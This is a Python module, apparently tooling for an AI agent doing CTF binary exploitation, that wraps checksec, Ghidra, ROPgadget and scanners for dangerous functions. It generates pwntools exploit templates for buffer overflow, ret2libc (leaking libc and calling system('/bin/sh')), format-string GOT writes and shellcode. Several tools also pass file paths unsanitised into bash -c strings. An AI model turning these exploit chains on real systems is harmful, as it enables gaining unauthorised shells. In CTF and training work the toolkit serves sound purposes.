"""二进制漏洞挖掘 + 漏洞利用工具集

覆盖:
1. 二进制分析: checksec, file, strings (基础)
2. 自动反编译: ghidra headless mode
3. 漏洞模式识别: 危险函数扫描 + 控制流分析
4. ROP 利用: ROPgadget / ropper 自动搜索 gadget
5. 格式化字符串: 自动化利用
6. Exploit 模板: pwntools exploit 骨架生成
"""
import os
import subprocess
import tempfile
import logging
from config import config
from tools.base import register_tool, run_cmd

logger = logging.getLogger(__name__)


def _run(cmd, timeout=180):
    """执行命令（超时整组强杀，防子进程挂死）"""
    return run_cmd(cmd, timeout=timeout)


@register_tool(
    name="binary_analyze",
    description="""二进制文件综合分析。自动执行:

1. file - 识别文件类型和架构
2. checksec - 检查保护机制 (NX/Canary/PIE/RELRO)
3. strings - 提取可见字符串
4. readelf - 查看 ELF 节区和符号
5. objdump - 反汇编关键函数

输出: 文件信息、保护机制、可疑字符串、关键函数反汇编。

适合: 拿到二进制文件第一步，快速了解其结构和可利用点。
""",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "二进制文件路径"},
            "disasm_func": {
                "type": "string",
                "description": "要反汇编的函数名，如 'main'。不指定则只反汇编入口点",
            },
        },
        "required": ["path"],
    },
)
def binary_analyze(path: str, disasm_func: str = "") -> str:
    """二进制综合分析"""
    if not os.path.isabs(path):
        path = os.path.join(config.WORK_DIR, path)

    if not os.path.exists(path):
        return f"[错误] 文件不存在: {path}"

    results = [f"📄 二进制文件: {path}"]

    # 1. file
    r = _run(["file", path], timeout=10)
    results.append(f"\n[file]\n{r}")

    # 2. checksec
    r = _run(["checksec", "--file=" + path], timeout=15)
    results.append(f"\n[checksec 保护机制]\n{r}")

    # 3. strings (搜索关键信息)
    r = _run(
        ["bash", "-c", f"strings '{path}' | grep -iE 'flag|ctf|key|password|admin|login|shell|/bin|/tmp' | head -30"],
        timeout=30,
    )
    if r and "[无输出]" not in r:
        results.append(f"\n🎯 [strings 关键发现]\n{r}")

    # 4. readelf (ELF 头信息)
    r = _run(["readelf", "-h", path], timeout=10)
    if "ELF" in r:
        results.append(f"\n[ELF 头]\n{r}")

        # 节区信息
        r = _run(["readelf", "-S", path], timeout=10)
        results.append(f"\n[节区]\n{r}")

        # 符号表
        r = _run(
            ["bash", "-c", f"readelf -s '{path}' | grep -iE 'main|vuln|win|flag|read|gets|scanf|system|exec' | head -20"],
            timeout=10,
        )
        if r and "[无输出]" not in r:
            results.append(f"\n🎯 [可疑符号]\n{r}")

    # 5. objdump 反汇编关键函数
    if disasm_func:
        r = _run(
            ["bash", "-c", f"objdump -d '{path}' | grep -A 50 '<{disasm_func}>:'"],
            timeout=30,
        )
        if r and "[无输出]" not in r:
            results.append(f"\n[反汇编 {disasm_func}]\n{r}")

    return "\n".join(results)


@register_tool(
    name="ghidra_decompile",
    description="""使用 Ghidra headless 模式反编译二进制文件。

自动执行:
1. 导入二进制到 Ghidra
2. 运行反编译分析
3. 导出 C 伪代码到文件
4. 提取关键函数的反编译结果

参数:
- binary: 二进制文件路径
- functions: 要反编译的函数名列表，逗号分隔。不指定则反编译 main 和所有疑似漏洞函数

输出: 指定函数的 C 伪代码。

注意: Ghidra 分析较慢，首次运行可能需要 1-3 分钟。
""",
    parameters={
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "二进制文件路径"},
            "functions": {
                "type": "string",
                "description": "要反编译的函数名，逗号分隔。如 'main,vuln,win'。不指定则自动检测",
            },
        },
        "required": ["binary"],
    },
)
def ghidra_decompile(binary: str, functions: str = "") -> str:
    """Ghidra headless 反编译"""
    if not os.path.isabs(binary):
        binary = os.path.join(config.WORK_DIR, binary)

    if not os.path.exists(binary):
        return f"[错误] 文件不存在: {binary}"

    # Ghidra 路径检测
    ghidra_paths = [
        "/opt/ghidra/support/analyzeHeadless",
        "/usr/share/ghidra/support/analyzeHeadless",
        "/usr/local/ghidra/support/analyzeHeadless",
    ]
    ghidra_cmd = None
    for p in ghidra_paths:
        if os.path.exists(p):
            ghidra_cmd = p
            break

    if not ghidra_cmd:
        return "[错误] 未找到 Ghidra。请安装: 参考 https://ghidra-sre.org/"

    # 创建临时项目目录
    project_dir = tempfile.mkdtemp(prefix="ghidra_proj_")
    project_name = "ctf_project"
    output_script = os.path.join(project_dir, "decompile.java")

    # Ghidra 反编译脚本
    decompile_script = """
import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionManager;
import ghidra.program.model.listing.Listing;

public class decompile extends ghidra.app.script.GhidraScript {
    @Override
    public void run() throws Exception {
        DecompInterface decomp = new DecompInterface();
        decomp.openProgram(currentProgram);

        FunctionManager fm = currentProgram.getFunctionManager();
        String[] targets = new String[]{"TARGET_FUNCS"};

        for (Function func : fm.getFunctions(true)) {
            String name = func.getName();
            boolean shouldDecompile = false;

            // 如果指定了函数名，只反编译指定的
            if (targets.length > 0 && !targets[0].isEmpty()) {
                for (String t : targets) {
                    if (name.equals(t)) {
                        shouldDecompile = true;
                        break;
                    }
                }
            } else {
                // 否则反编译 main 和疑似漏洞函数
                if (name.equals("main") || name.contains("vuln") ||
                    name.contains("win") || name.contains("flag") ||
                    name.contains("read") || name.contains("gets")) {
                    shouldDecompile = true;
                }
            }

            if (shouldDecompile) {
                DecompileResults res = decomp.decompileFunction(func, 30);
                if (res.decompileCompleted()) {
                    println("=== " + name + " ===");
                    println(res.getDecompiledFunction().getC());
                }
            }
        }
        decomp.dispose();
    }
}
"""

    targets = functions.replace(",", " ").strip() if functions else ""
    decompile_script = decompile_script.replace("TARGET_FUNCS", targets)

    with open(output_script, "w") as f:
        f.write(decompile_script)

    # 运行 Ghidra headless
    cmd = [
        ghidra_cmd,
        project_dir, project_name,
        "-import", binary,
        "-postScript", "decompile.java",
        "-scriptPath", project_dir,
        "-deleteProject",
    ]

    r = _run(cmd, timeout=300)

    # 提取反编译结果
    if "===" in r:
        return "[Ghidra 反编译结果]\n" + r
    else:
        return f"[Ghidra 分析完成，但未提取到反编译结果]\n{r[-2000:]}"


@register_tool(
    name="vuln_pattern_scan",
    description="""扫描二进制中的危险函数和漏洞模式。

检测:
- 危险函数: gets, strcpy, sprintf, scanf, system, execve
- 格式化字符串漏洞: printf(user_input) 而非 printf("%s", user_input)
- 整数溢出: 有符号/无符号转换
- 堆漏洞: malloc/use-after-free/double-free
- 硬编码凭证: password, key, token

输出: 检测到的漏洞模式和位置。

适合: 二进制漏洞挖掘第二步，快速定位潜在漏洞点。
""",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "二进制文件路径"},
        },
        "required": ["path"],
    },
)
def vuln_pattern_scan(path: str) -> str:
    """漏洞模式扫描"""
    if not os.path.isabs(path):
        path = os.path.join(config.WORK_DIR, path)

    if not os.path.exists(path):
        return f"[错误] 文件不存在: {path}"

    results = [f"🔍 漏洞模式扫描: {path}"]

    # 危险函数检测
    dangerous_funcs = [
        "gets", "strcpy", "strcat", "sprintf", "vsprintf",
        "scanf", "sscanf", "fscanf", "vscanf",
        "system", "popen", "execve", "execvp", "execl",
        "memcpy", "memmove",  # 需要检查长度参数
        "read",  # 需要检查缓冲区大小
    ]

    found_dangerous = []
    for func in dangerous_funcs:
        r = _run(
            ["bash", "-c", f"objdump -t '{path}' 2>/dev/null | grep ' {func}$' | head -5"],
            timeout=10,
        )
        if r and "[无输出]" not in r and "错误" not in r:
            found_dangerous.append((func, r))

    if found_dangerous:
        results.append("\n⚠️ [检测到危险函数]")
        for func, info in found_dangerous:
            results.append(f"  • {func}")
            results.append(f"    {info[:200]}")
    else:
        results.append("\n[未检测到标准危险函数]")

    # 检查 PLT 表中的危险函数调用
    r = _run(
        ["bash", "-c", f"objdump -d '{path}' 2>/dev/null | grep -E 'call.*<(gets|strcpy|sprintf|scanf|system|execve)' | head -20"],
        timeout=15,
    )
    if r and "[无输出]" not in r:
        results.append(f"\n⚠️ [危险函数调用点]\n{r}")

    # 检查硬编码字符串中的凭证
    r = _run(
        ["bash", "-c", f"strings '{path}' | grep -iE 'password|passwd|secret|token|key|admin|root|login' | head -20"],
        timeout=15,
    )
    if r and "[无输出]" not in r:
        results.append(f"\n🔑 [可疑凭证字符串]\n{r}")

    # 检查 /bin/sh 或 /bin/bash 引用
    r = _run(
        ["bash", "-c", f"strings '{path}' | grep -E '/bin/(sh|bash)|/bin/dash' | head -5"],
        timeout=10,
    )
    if r and "[无输出]" not in r:
        results.append(f"\n🎯 [发现 shell 路径引用 - 可能存在 system('/bin/sh') 后门]\n{r}")

    return "\n".join(results)


@register_tool(
    name="rop_gadget_search",
    description="""搜索 ROP gadget。使用 ROPgadget 工具。

输出所有可用的 gadget，包括:
- pop rdi; ret (64位传参)
- pop rsi; ret
- pop rdx; ret
- ret (栈对齐)
- syscall; ret

适合: pwn 题构造 ROP 链时，搜索可用的 gadget。
""",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "二进制文件路径"},
            "filter": {
                "type": "string",
                "description": "gadget 过滤关键词，如 'pop rdi' 或 'syscall'。不指定则列出全部",
            },
            "depth": {
                "type": "integer",
                "description": "gadget 最大深度，默认 10",
            },
        },
        "required": ["path"],
    },
)
def rop_gadget_search(path: str, filter: str = "", depth: int = 10) -> str:
    """搜索 ROP gadget"""
    if not os.path.isabs(path):
        path = os.path.join(config.WORK_DIR, path)

    if not os.path.exists(path):
        return f"[错误] 文件不存在: {path}"

    cmd = ["ROPgadget", "--binary", path, "--depth", str(depth)]

    r = _run(cmd, timeout=120)

    if filter:
        # 过滤包含关键词的 gadget
        filtered = [line for line in r.split("\n") if filter.lower() in line.lower()]
        if filtered:
            return f"[ROP gadget 过滤: '{filter}']\n" + "\n".join(filtered[:50])
        else:
            return f"[未找到匹配 '{filter}' 的 gadget]"

    # 不过滤则返回关键 gadget
    key_gadgets = []
    key_patterns = [
        "pop rdi", "pop rsi", "pop rdx", "pop rcx",
        "pop rdi ; ret", "pop rsi ; ret",
        "ret", "syscall", "int 0x80",
        "pop eax", "pop ebx", "pop ecx", "pop edx",
        "mov rdi", "mov rsi",
    ]

    for line in r.split("\n"):
        for pattern in key_patterns:
            if pattern in line.lower():
                key_gadgets.append(line)
                break

    if key_gadgets:
        return f"[关键 ROP gadget]\n" + "\n".join(key_gadgets[:50])
    return r[-3000:]


@register_tool(
    name="exploit_template",
    description="""生成 pwntools exploit 模板。

根据二进制文件的架构和保护机制，自动生成 exploit 骨架代码。

参数:
- binary: 目标二进制文件路径
- vuln_type: 漏洞类型 - buffer_overflow / format_string / ret2libc / ret2shellcode
- remote_host: 远程靶机地址 (可选)
- remote_port: 远程靶机端口 (可选)

输出: 生成的 exploit.py 文件路径和内容预览。
""",
    parameters={
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "目标二进制文件路径"},
            "vuln_type": {
                "type": "string",
                "enum": ["buffer_overflow", "format_string", "ret2libc", "ret2shellcode"],
                "description": "漏洞类型",
            },
            "remote_host": {"type": "string", "description": "远程靶机 IP (可选)"},
            "remote_port": {"type": "string", "description": "远程靶机端口 (可选)"},
        },
        "required": ["binary", "vuln_type"],
    },
)
def exploit_template(binary: str, vuln_type: str,
                     remote_host: str = "", remote_port: str = "") -> str:
    """生成 exploit 模板"""
    if not os.path.isabs(binary):
        binary = os.path.join(config.WORK_DIR, binary)

    if not os.path.exists(binary):
        return f"[错误] 文件不存在: {binary}"

    # 检测架构
    r = _run(["file", binary], timeout=10)
    is_64bit = "x86-64" in r or "ELF 64-bit" in r
    arch = "amd64" if is_64bit else "i386"

    # 生成模板
    remote_line = ""
    if remote_host and remote_port:
        remote_line = f"p = remote('{remote_host}', {remote_port})"

    if vuln_type == "buffer_overflow":
        template = f"""#!/usr/bin/env python3
# Exploit: Buffer Overflow ({arch})
from pwn import *

# ── 配置 ──
context.arch = '{arch}'
context.log_level = 'debug'

elf = ELF('{binary}')

# ── 连接 ──
{remote_line if remote_line else "p = process('" + binary + "')"}
# p = gdb.debug('./{os.path.basename(binary)}', 'b *main\\nc')

# ── 找溢出偏移 ──
# 方法1: cyclic
# p.sendline(cyclic(200))
# 拿到崩溃地址后: offset = cyclic_find(崩溃地址)

offset = 0  # TODO: 填入溢出偏移

# ── 构造 payload ──
# 选项A: ret2text (有后门函数)
# backdoor = elf.symbols['backdoor']  # 或 win, getflag 等
# payload = b'A' * offset + p64(backdoor)

# 选项B: ret2libc
# from pwn import *
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# main_addr = elf.symbols['main']
#
# # 泄露 libc
# payload = b'A' * offset
# payload += p64(pop_rdi_ret)  # ROPgadget --binary {binary} | grep 'pop rdi'
# payload += p64(puts_got)
# payload += p64(puts_plt)
# payload += p64(main_addr)
# p.sendline(payload)
# leaked = u64(p.recv(6).ljust(8, b'\\x00'))
# libc.address = leaked - libc.symbols['puts']
#
# # getshell
# system = libc.symbols['system']
# binsh = next(libc.search(b'/bin/sh'))
# payload2 = b'A' * offset
# payload2 += p64(pop_rdi_ret)
# payload2 += p64(binsh)
# payload2 += p64(system)
# p.sendline(payload2)

payload = b'A' * offset  # TODO: 替换为实际 payload

# ── 发送 payload ──
p.sendline(payload)

# ── 交互 ──
p.interactive()
"""

    elif vuln_type == "format_string":
        template = f"""#!/usr/bin/env python3
# Exploit: Format String ({arch})
from pwn import *

context.arch = '{arch}'
context.log_level = 'debug'

elf = ELF('{binary}')

{remote_line if remote_line else "p = process('" + binary + "')"}

# ── 找格式化字符串偏移 ──
# 发送 AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# 找到 0x41414141 出现的位置，即为偏移

# ── 泄露栈 ──
# payload = b'AAAA' + b'%p.' * 20
# p.sendline(payload)
# leaked = p.recvall()
# print(leaked)

# ── 任意地址写 (32位) ──
# 目标: 覆盖 GOT 表项
# target_addr = elf.got['puts']  # 要覆盖的地址
# value = 0x08048456  # 要写入的值
#
# payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2) + p32(target_addr + 3)
# payload += f'%{{(value & 0xff) - 16}}x%{{offset}}$hhn'.encode()
# # ... 逐字节写入

# ── 64位格式化字符串 ──
# 需要考虑栈对齐和前 6 个参数在寄存器中

offset = 6  # TODO: 填入实际偏移
target_addr = 0x0  # TODO: 填入目标地址
value = 0x0  # TODO: 填入要写入的值

p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p')
print(p.recvline())

p.interactive()
"""

    elif vuln_type == "ret2libc":
        template = f"""#!/usr/bin/env python3
# Exploit: ret2libc ({arch})
from pwn import *

context.arch = '{arch}'
context.log_level = 'debug'

elf = ELF('{binary}')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # TODO: 替换为题目提供的 libc

{remote_line if remote_line else "p = process('" + binary + "')"}
# p = gdb.debug('./{os.path.basename(binary)}', 'b *main\\nc')

offset = 0  # TODO: 填入溢出偏移

# ── Stage 1: 泄露 libc 地址 ──
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# 找 pop rdi; ret gadget
# ROPgadget --binary {binary} | grep 'pop rdi ; ret'
pop_rdi_ret = 0x0  # TODO: 填入 gadget 地址
ret_gadget = 0x0  # TODO: 用于栈对齐

payload1 = b'A' * offset
payload1 += p64(pop_rdi_ret)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

p.sendline(payload1)

# 接收泄露的地址
leaked = u64(p.recvline().strip().ljust(8, b'\\x00'))
log.info(f'泄露的 puts@libc: {{hex(leaked)}}')

# 计算 libc 基址
libc.address = leaked - libc.symbols['puts']
log.info(f'libc 基址: {{hex(libc.address)}}')

# ── Stage 2: getshell ──
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(ret_gadget)  # 栈对齐 (16字节)
payload2 += p64(pop_rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
"""

    elif vuln_type == "ret2shellcode":
        template = f"""#!/usr/bin/env python3
# Exploit: ret2shellcode ({arch})
from pwn import *

context.arch = '{arch}'
context.log_level = 'debug'

elf = ELF('{binary}')

{remote_line if remote_line else "p = process('" + binary + "')"}

# ── 生成 shellcode ──
# 使用 pwntools 内置 shellcode
shellcode = asm(shellcraft.sh())
log.info(f'shellcode 长度: {{len(shellcode)}}')

# ── 找 shellcode 存放地址 ──
# 方法1: 如果栈可执行 (NX disabled), 放到栈上
# 方法2: 如果 bss 段可写可执行, 放到 bss
# 方法3: 如果有 mprotect 调用, 可以手动改权限

# 假设 NX 关闭, shellcode 在栈上
# 需要泄露栈地址或使用 jmp esp/call esp

offset = 0  # TODO: 填入溢出偏移
shellcode_addr = 0x0  # TODO: 填入 shellcode 存放地址

# payload = b'A' * offset
# payload += p64(shellcode_addr)
# payload += shellcode

p.interactive()
"""

    else:
        return f"[错误] 未知漏洞类型: {vuln_type}"

    # 保存模板
    output_path = os.path.join(config.OUTPUT_DIR, f"exploit_{vuln_type}.py")
    with open(output_path, "w") as f:
        f.write(template)

    return f"[Exploit 模板已生成]\n路径: {output_path}\n架构: {arch}\n漏洞类型: {vuln_type}\n\n[内容预览]\n{template[:1000]}..."
